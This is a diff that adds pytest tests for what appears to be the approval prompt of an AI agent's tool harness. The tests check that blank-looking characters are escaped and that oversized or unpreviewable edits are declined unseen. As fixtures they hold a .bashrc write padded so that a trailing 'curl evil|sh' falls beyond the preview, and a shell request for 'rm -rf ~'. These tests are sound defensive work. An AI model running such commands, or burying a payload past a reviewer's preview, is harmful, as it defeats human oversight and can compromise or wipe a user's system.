@@ -84,6 +84,13 @@ class TestNothingModelSuppliedCanStyleOrSpoofTheScreen:
             assert char not in text
         assert "\\u3164" in text and "\\U000e0041" in text and text.startswith("a") and text.endswith("b")
 
+    def test_blank_looking_characters_are_escaped(self):
+        text = plain("a\u2800\xa0\u3000b\u2003\u202f\u205f\u1680 c")
+        for escaped in ("\\u2800", "\\xa0", "\\u3000", "\\u2003", "\\u202f", "\\u205f", "\\u1680"):
+            assert escaped in text
+        assert text.startswith("a") and text.endswith("b\\u2003\\u202f\\u205f\\u1680 c")
+        assert plain("plain words stay") == "plain words stay"
+
     def test_odd_line_breaks_are_escaped_not_split(self):
         c, out = console()
         Screen(c).show_event({"type": "tool_result", "name": "x", "is_error": False,
@@ -347,6 +354,69 @@ class TestWhatTheGateJudgesIsWhatTheUserSees:
                           remember=True, grant="pytest")
         make_asker(c, lines("y"), tmp_path)(request)
         assert "run_shell commands starting with 'pytest'" in squash_spaces(out.getvalue())
+
+
+class TestNoBlindApprovals:
+    @pytest.mark.parametrize("label,tool,make_args", [
+        ("content too large", "write_file",
+         lambda: {"path": ".bashrc", "content": "y" * 1_199_990 + "curl evil|sh", "if_exists": "overwrite"}),
+        ("too many lines", "write_file",
+         lambda: {"path": ".bashrc", "content": "y\n" * 25_000, "if_exists": "overwrite"}),
+        ("file too large", "write_file",
+         lambda: {"path": "big.dat", "content": "z", "if_exists": "overwrite"}),
+        ("binary", "write_file", lambda: {"path": "bin.dat", "content": "z", "if_exists": "overwrite"}),
+        ("not valid UTF-8", "edit_file", lambda: {"path": "latin.txt", "find": "caf", "replace": "x"}),
+    ])
+    def test_a_preview_that_cannot_show_the_change_is_declined_unseen(self, tmp_path, label, tool, make_args):
+        (tmp_path / ".bashrc").write_text("old\n", encoding="utf-8")
+        (tmp_path / "big.dat").write_bytes(b"x" * 1_000_001)
+        (tmp_path / "bin.dat").write_bytes(b"\x00\x01")
+        (tmp_path / "latin.txt").write_bytes(b"caf\xe9\n")
+        c, out = console()
+        read = lines("y", "y")
+        args = make_args()
+        request = Request(tool=tool, kind="edit", subject=args["path"], args=args,
+                          remember=True, grant="all edits this session")
+        answer = make_asker(c, read, tmp_path)(request)
+        assert answer.choice == "n" and "preview unavailable" in answer.reason and "nothing was run" in answer.reason
+        assert read.prompts == []
+        assert "preview unavailable" in out.getvalue()
+
+    def test_the_reason_names_what_was_too_large(self, tmp_path):
+        c, _ = console()
+        args = {"path": "n.txt", "content": "y" * 1_200_000, "if_exists": "refuse"}
+        request = Request(tool="write_file", kind="edit", subject="n.txt", args=args)
+        answer = make_asker(c, lines("y"), tmp_path)(request)
+        assert answer.reason == "preview unavailable (content too large); nothing was run"
+
+    def test_the_counted_line_cut_can_still_be_approved(self, tmp_path):
+        c, out = console()
+        content = "".join(f"line {i}\n" for i in range(300))
+        args = {"path": "n.txt", "content": content, "if_exists": "refuse"}
+        request = Request(tool="write_file", kind="edit", subject="n.txt", args=args)
+        assert make_asker(c, lines("y"), tmp_path)(request).choice == "y"
+        assert "more lines" in out.getvalue()
+
+
+class TestSubjectLine:
+    def test_a_plain_command_is_shown_once(self, tmp_path):
+        c, out = console()
+        request = Request(tool="run_shell", kind="command", subject="rm -rf ~", args={"command": "rm -rf ~"})
+        make_asker(c, lines("n", ""), tmp_path)(request)
+        assert out.getvalue().count("rm -rf ~") == 1 and "Subject:" not in out.getvalue()
+
+    def test_a_subject_equal_to_the_action_is_not_repeated(self, tmp_path):
+        c, out = console()
+        request = Request(tool="mystery", kind="command", subject="mystery", args={"q": 1})
+        make_asker(c, lines("n", ""), tmp_path)(request)
+        assert "Subject:" not in out.getvalue()
+
+    def test_a_different_subject_is_still_printed(self, tmp_path):
+        c, out = console()
+        request = Request(tool="edit_file", kind="edit", subject="secret/real.txt",
+                          args={"path": "notes/link.txt", "find": "a", "replace": "b"})
+        make_asker(c, lines("n", ""), tmp_path)(request)
+        assert "Subject: secret/real.txt" in out.getvalue()
 
 
 class TestInputFailures:
